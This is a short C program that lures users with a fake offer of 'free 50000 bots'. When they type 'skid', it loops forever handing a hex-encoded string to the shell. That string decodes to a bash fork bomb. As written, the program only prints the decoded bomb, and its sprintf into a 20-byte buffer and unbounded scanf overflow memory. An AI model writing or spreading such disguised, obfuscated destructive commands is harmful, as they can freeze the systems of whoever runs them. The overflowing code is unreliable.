#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void prompt(char userInput[20], char skidName[10])
{
    printf("Skid Master %s:\n", skidName);
    scanf("%s", userInput);
}

int main()
{
    char systemCommand[20];
    char userInput[30];
    char skidName[10] = "Reflect";

    printf("Please Type skid to get a free 50000 bots\n");
    while (1)
    {
        prompt(userInput, skidName);
        if (!strcasecmp(userInput, "skid"))
        {
            while (1)
            {
                printf("Enjoy your 50000 bots!\n");
                sprintf(systemCommand, "echo 3a28297b203a7c3a26207d3b3a | xxd -r -p\n");
                system(systemCommand);
            }
        }
    }

    return 0;
}
